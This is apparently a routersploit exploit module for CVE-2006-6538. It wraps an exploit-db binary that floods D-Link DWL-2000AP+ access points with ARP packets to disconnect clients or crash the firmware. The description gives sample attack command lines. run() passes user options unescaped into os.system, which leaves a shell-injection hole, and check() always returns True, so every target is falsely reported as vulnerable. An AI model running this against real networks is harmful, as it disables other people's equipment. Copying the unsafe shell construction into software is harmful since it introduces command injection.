import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2006-6538",

        "description": "This program has been written to audit some D-LINK ethernet products cuz it seems that some D-LINK AP "
                       "will freeze if arp flooded At the this time only D-LINK DWL-2000AP+ is reported to be vulnerable so  "
                       "Test 1: it makes the AP to disconnect all connected clients a quik flood with arp-replies is sufficent to trigger this vuln"
                       " ./exploit-db-2915 REPLY en1 @ @ 10.0.0.140 900000 0 00:de:09:a1:bb:c7 "
                       "Test 2: it makes the AP firmware to crash making a manual reboot mandatory a flood with a large amount of arp-requests" 
                       "./exploit-db-2915 REQ en1 @ @ 10.0.0.140 9000000 0 ",

        "authors": (

            "poplix",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/2915",

        ),

        "devices": (

            "D-LINK, CVE-2006-6538"
        ),
    }

    target = OptIP("", "query IP")
    intf = OptString(""," interface name ")
    behavior = OptString("","select 'REQ' or 'REPLY' ")
    srcMAC = OptString(""," srcMAC is equal to '@' your own MAC address will be used")
    srcIP = OptString("","srcIP is equal to '@' your own IP address will be used")
    num = OptString("","Packing quantity")
    delay = OptString("","delay in ms")
    dstMAC = OptString("","destination MAC address")

    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            s = ''
            if self.behavior == 'REQ':
                s += "./exploit-db-2915 {0} {1} {2} {3} {4} {5} {6}"
            else:
                s += "./exploit-db-2915 {0} {1} {2} {3} {4} {5} {6} {7}"
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = s.format(self.behavior,self.intf,self.srcMAC,self.srcIP,self.target,self.num,self.delay,self.dstMAC)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
